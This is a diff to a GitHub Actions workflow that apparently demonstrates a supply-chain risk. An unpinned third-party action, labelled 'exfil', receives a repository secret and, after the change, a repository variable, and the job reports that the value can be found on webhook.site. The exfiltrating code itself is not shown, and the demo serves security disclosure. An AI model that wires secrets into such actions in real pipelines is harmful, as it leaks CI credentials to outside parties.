@@ -11,14 +11,9 @@ jobs:
   demo:
     runs-on: ubuntu-latest
     steps:
-      - name: Checkout
-        uses: actions/checkout@v4
-
-      # This is the vulnerable unpinned action – it will exfiltrate the secret
+      - uses: actions/checkout@v4
       - name: Run demo action (exfil)
         uses: yakosolana/demo-action@v1
         env:
-          DUMMY: ${{ secrets.MARINADE_DUMMY }}
-
-      # A harmless step to prove the job completed
-      - run: echo "Job finished – check webhook.site for the secret"
+          DUMMY: ${{ vars.MARINADE_VAR }}
+      - run: echo "Job finished – check webhook.site for the exfiltrated variable"
